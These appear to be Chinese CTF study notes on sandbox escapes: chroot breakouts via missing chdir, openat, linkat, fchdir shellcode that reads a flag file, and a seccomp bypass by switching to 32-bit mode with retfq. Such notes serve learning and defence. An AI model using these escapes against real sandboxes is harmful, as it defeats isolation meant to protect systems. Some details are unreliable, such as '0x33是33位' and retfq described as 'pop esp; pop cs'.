# SandBox

### 突破`chroot`

#### 无`chdir`突破

`chroot`不会设置工作目录，需要使用`chdir`设置进入`jail`。

因此，没有使用`chdir`设置，我们就在`jail`外，不受任何限制。

读取文件只需要用当前工作目录下的相对文件

#### 使用openat

* 如果在`chdir`之前打开了，不在`jail`里的目录。使用`openat`就可以打开不在`jail`里的文件。
	```C
	int f = open("/", O_RDONLY | O_DIRECTORY);
	chroot("/home/liu");
	chdir("/");
	int f2 = openat(f,"flag",0); //读取/flag
	```

#### 使用`linkat`
* 如果在`chdir`之前打开了，不在`jail`里的目录。使用`linkat`创建硬链接，将`jail`外的文件链接到jail里面。
```C
int f = open("/", O_RDONLY | O_DIRECTORY);
chroot("/home/liu");
chdir("/");
int f2 = openat(f,"flag",0); //读取/flag
linkat(f,"flag",jail_dir,"new_flag",0);
```
#### 使用 `fchdir`
* 如果在`chdir`之前打开了，不在`jail`里的目录。使用`fchdir`更改工作目录，到不在`jail`里的目录。
```asm
	mov rdi,3 ;根目录文件符号
    mov rax,81
    syscall

    lea rdi,[rip+flag]
    mov rsi,0
    mov rax,2
    syscall

    mov rdi,1
    mov rsi,rax
    mov rdx,0
    mov r10,1000
    mov rax,40
    syscall

flag:
	.string "flag"
```
#### 使用`chroot `&`mkdir`
* 使用`mkdir`在`jail`中创建目录，在使用`chroot`设置新的`jail`，即可逃出。
### 突破`seccomp`
#### 使用模式转换（`retfq`）
`seccomp`会检测我们的系统调用号，而我们通过模式转换在64位程序中执行32位系统调用，
比如`fstat`系统调用，调用号是0x5（64位是`sys_fstat`，32位是`sys_open`），seccomp只检测调用号是不是0x5。
通过`retfq`切换模式，`retfq`修改`cs`中的值，`0x23`是32位，`0x33`是33位
`retfq`相当于 `pop esp ; pop cs`
**注意：**要进行栈迁移，64位栈地址超过了4字节，需要使用mmap设置一块地址长度在四字节的地址，或另外找一块内存地址。